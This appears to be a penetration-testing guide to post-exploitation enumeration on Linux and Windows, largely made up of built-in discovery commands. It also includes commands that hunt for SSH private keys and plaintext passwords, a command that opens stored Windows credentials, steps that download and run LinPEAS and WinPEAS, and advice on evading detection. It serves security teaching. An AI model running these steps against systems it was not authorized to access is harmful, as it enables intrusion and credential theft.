Post-exploitation enumeration focuses on gathering information from a compromised system to facilitate lateral movement, persistence, data exfiltration, or further privilege escalation. This guide details enumeration techniques for Linux and Windows systems, using built-in tools and minimal third-party binaries.

---

### **1. Purpose of Post-Exploitation Enumeration**

- **Understand the Environment**:
    - Identify the operating system, installed applications, and configuration.
- **Gather Credentials**:
    - Locate plaintext credentials, password hashes, or SSH keys.
- **Identify Network Layout**:
    - Discover other systems and services on the network.
- **Locate Sensitive Data**:
    - Search for files containing confidential information.
- **Prepare for Lateral Movement**:
    - Find information to pivot to other systems.
- **Establish Persistence**:
    - Look for methods to maintain access.

---

### **2. Linux Enumeration**

### **a. System Information**

1. **Basic System Info**:
    
    ```bash
    uname -a        # Kernel version and architecture
    cat /etc/os-release  # OS version
    hostname        # Hostname
    whoami          # Current user
    
    ```
    
2. **Environment Variables**:
    
    ```bash
    env             # Environment variables
    echo $PATH      # Path variable
    
    ```
    
3. **Processes**:
    
    ```bash
    ps aux          # All running processes
    top             # Interactive process viewer
    
    ```
    
4. **File Systems**:
    
    ```bash
    df -h           # Disk usage
    mount           # Mounted filesystems
    
    ```
    

### **b. User and Group Enumeration**

1. **Logged-In Users**:
    
    ```bash
    who             # Current sessions
    w               # Active users
    last            # Login history
    
    ```
    
2. **User Details**:
    
    ```bash
    cat /etc/passwd  # List of users
    cat /etc/group   # List of groups
    id               # Current user's ID and group
    
    ```
    
3. **Sudo Privileges**:
    
    ```bash
    sudo -l          # Check current user's sudo rights
    
    ```
    

### **c. Network Enumeration**

1. **Interfaces and Routes**:
    
    ```bash
    ifconfig         # Network interfaces
    ip addr          # Detailed interface info
    ip route         # Routing table
    
    ```
    
2. **Connections**:
    
    ```bash
    netstat -tuln    # Listening services
    ss -tuln         # Alternative for netstat
    
    ```
    
3. **DNS Configuration**:
    
    ```bash
    cat /etc/resolv.conf  # DNS servers
    
    ```
    

### **d. Service Enumeration**

1. **System Services**:
    
    ```bash
    systemctl list-units --type=service  # Active services
    service --status-all                 # Legacy service list
    
    ```
    
2. **Web Services**:
    - Search for web server files:
        
        ```bash
        find / -name '*.conf' 2>/dev/null | grep apache
        
        ```
        

### **e. Searching for Sensitive Files**

1. **Common Sensitive Files**:
    
    ```bash
    find / -name "*id_rsa" 2>/dev/null  # SSH private keys
    find / -name "*.conf" 2>/dev/null  # Configuration files
    
    ```
    
2. **Search for Credentials**:
    
    ```bash
    grep -i "password" /var/www/html/*  # Search for plaintext passwords
    
    ```
    

---

### **3. Windows Enumeration**

### **a. System Information**

1. **Basic Info**:
    
    ```powershell
    systeminfo                 # System details
    Get-WmiObject Win32_OperatingSystem | Select-Object *  # OS and hardware
    
    ```
    
2. **Environment Variables**:
    
    ```powershell
    Get-ChildItem Env:         # List environment variables
    
    ```
    
3. **Processes**:
    
    ```powershell
    Get-Process                # Running processes
    tasklist                   # CLI alternative
    
    ```
    
4. **File Systems**:
    
    ```powershell
    Get-PSDrive                # Mounted drives
    
    ```
    

### **b. User and Group Enumeration**

1. **Logged-In Users**:
    
    ```powershell
    query user                 # Currently logged-in users
    Get-LocalUser              # List local users
    
    ```
    
2. **Groups and Permissions**:
    
    ```powershell
    Get-LocalGroup             # List local groups
    Get-LocalGroupMember -Group Administrators  # Check administrators
    
    ```
    

### **c. Network Enumeration**

1. **Interfaces and Routes**:
    
    ```powershell
    ipconfig /all              # Network interfaces
    route print                # Routing table
    
    ```
    
2. **Connections**:
    
    ```powershell
    netstat -ano               # Active connections
    
    ```
    
3. **DNS Configuration**:
    
    ```powershell
    Get-DnsClientServerAddress # DNS servers
    
    ```
    

### **d. Service Enumeration**

1. **Installed Services**:
    
    ```powershell
    Get-Service                # All services
    sc query                   # Command-line alternative
    
    ```
    
2. **Scheduled Tasks**:
    
    ```powershell
    schtasks                   # List scheduled tasks
    
    ```
    

### **e. Searching for Sensitive Files**

1. **Common Sensitive Files**:
    
    ```powershell
    dir C:\\ /S /A:-D | findstr /I "password"  # Search for password in files
    
    ```
    
2. **Credential Stores**:
    
    ```powershell
    rundll32.exe keymgr.dll,KRShowKeyMgr  # View stored credentials
    
    ```
    

---

### **4. Additional Tools for Enumeration**

1. **Linux**:
    - **LinPEAS**:
        
        ```bash
        curl -L <https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh> -o linpeas.sh
        chmod +x linpeas.sh
        ./linpeas.sh
        
        ```
        
2. **Windows**:
    - **WinPEAS**:
        
        ```powershell
        iwr -Uri <https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe> -OutFile winPEASany.exe
        ./winPEASany.exe
        
        ```
        
    - **Seatbelt**:
        
        ```powershell
        .\\Seatbelt.exe all
        
        ```
        

---

### **5. Tips for Effective Enumeration**

- **Stay Stealthy**:
    - Use built-in tools to minimize detection.
    - Avoid excessive file searches or noisy commands.
- **Document Findings**:
    - Maintain a clear log of enumerated data.
- **Focus on High-Value Targets**:
    - Credentials, configuration files, and network data.

---

### **6. Ethical Considerations**

- **Authorized Engagements**:
    - Ensure all activities are within scope.
- **No Unnecessary Changes**:
    - Avoid modifying or damaging the system.
- **Report Findings**:
    - Document and report all findings accurately for remediation.
